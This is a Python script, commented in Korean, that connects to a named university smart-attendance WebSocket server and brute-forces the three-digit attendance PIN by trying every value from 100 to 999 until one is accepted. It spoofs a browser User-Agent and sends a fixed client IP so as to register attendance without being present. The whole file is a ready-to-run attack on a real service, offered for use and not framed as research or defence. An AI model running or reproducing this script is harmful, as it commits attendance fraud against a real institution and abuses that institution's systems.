# Python 3.9+
# 필요한 라이브러리: websockets
import asyncio
import websockets
import json
import time
from asyncio import TimeoutError # ◀◀◀ (추가) 타임아웃 예외 처리를 위해 import

# --------------------------------------------------------------------------
# ▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼ 사용자 설정 영역 ▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼
# --------------------------------------------------------------------------

# 1. 웹소켓 서버 주소
WEBSOCKET_URI = "wss://attend1.hellolms.com/smartAttend"

# 2. 동적으로 추출해야 하는 값 (가장 중요!)
DYNAMIC_ADRESS = "chosun-T33KBVKVEDOXAGY65M5H6U4BGI" # 예시 값 (실행 전 실제 값으로 변경!)
DYNAMIC_ID = "OP5OVS3B2UJKBOUSEXOPGFPYCM"            # 예시 값 (실행 전 실제 값으로 변경!)

# 3. 요청 간의 시간 간격 (초 단위)
REQUEST_DELAY = 1.0

# 4. 서버 응답 대기 시간 (초 단위) ◀◀◀ (추가) 이 시간을 초과하면 프로그램 자동 종료
WAIT_TIMEOUT = 30

# 5. 브라우저인 것처럼 보이기 위한 헤더 정보
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36"
}

# --------------------------------------------------------------------------
# ▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲ 사용자 설정 영역 ▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲
# --------------------------------------------------------------------------


async def run_brute_force_attend():
    """
    웹소켓에 연결하여 100~999까지의 PIN 번호를 대입하는 메인 함수
    """
    print("✅ 자동 출석 프로그램을 시작합니다.")
    print(f"ADDRESS: {DYNAMIC_ADRESS}")
    print(f"ID: {DYNAMIC_ID}")

    try:
        async with websockets.connect(WEBSOCKET_URI, extra_headers=HEADERS) as websocket:
            print(f"\n[1단계] 서버에 연결되었습니다. {WAIT_TIMEOUT}초 동안 출석 가능 상태를 확인합니다...")

            snow_payload = {"act": "snow", "id": DYNAMIC_ID}
            await websocket.send(json.dumps(snow_payload))

            # ▼▼▼▼▼▼▼▼▼▼▼▼ (수정) 타임아웃 예외 처리 로직 ▼▼▼▼▼▼▼▼▼▼▼▼
            try:
                # 설정된 WAIT_TIMEOUT 시간 동안만 서버 응답을 기다림
                response = await asyncio.wait_for(websocket.recv(), timeout=WAIT_TIMEOUT)
                data = json.loads(response)
            except TimeoutError:
                # 시간이 초과되면 예외 발생
                print(f"\n⚠️ 설정된 시간({WAIT_TIMEOUT}초) 내에 서버로부터 응답이 없습니다.")
                print("   - 교수님께서 아직 출석을 시작하지 않았거나, ID 값이 잘못되었을 수 있습니다.")
                print("   - 프로그램을 종료합니다.")
                return # 함수 종료
            # ▲▲▲▲▲▲▲▲▲▲▲▲ (수정) 타임아웃 예외 처리 로직 ▲▲▲▲▲▲▲▲▲▲▲▲

            if data.get("act") == "snow" and data.get("state") == "1":
                print("👍 출석이 진행 중입니다. PIN 번호 대입을 시작합니다.\n")
            else:
                print("❌ 현재 출석 가능한 상태가 아니거나 이미 처리되었습니다. 프로그램을 종료합니다.")
                print(f"   서버 응답: {data}")
                return

            # [2단계] 100부터 999까지 PIN 번호 무차별 대입
            for pin in range(100, 1000):
                print(f"⏳ PIN: {pin} 시도 중...")

                attend_payload = {
                    "act": "attend",
                    "id": DYNAMIC_ID,
                    "ip": "172.20.62.197",
                    "device": "Python-Client",
                    "pin": str(pin)
                }

                await websocket.send(json.dumps(attend_payload))
                response = await websocket.recv()
                data = json.loads(response)

                if data.get("state") == "y":
                    print(f"\n🎉🎉🎉 출석 성공! PIN 번호는 [ {pin} ] 입니다. 🎉🎉🎉")
                    print("프로그램을 종료합니다.")
                    return
                elif data.get("state") == "w":
                    pass
                else:
                    print(f"⚠️ 알 수 없는 응답 수신: {data}")

                await asyncio.sleep(REQUEST_DELAY)

            print("\n❌ 100-999 범위의 모든 PIN 번호를 시도했지만 실패했습니다.")

    except websockets.exceptions.ConnectionClosedError as e:
        print(f"\n🚨 서버와의 연결이 예기치 않게 끊겼습니다. (에러: {e})")
        print("   - IP가 차단되었거나 서버에 문제가 발생했을 수 있습니다.")
    except Exception as e:
        print(f"\n🚨 알 수 없는 오류가 발생했습니다: {e}")


if __name__ == "__main__":
    asyncio.run(run_brute_force_attend())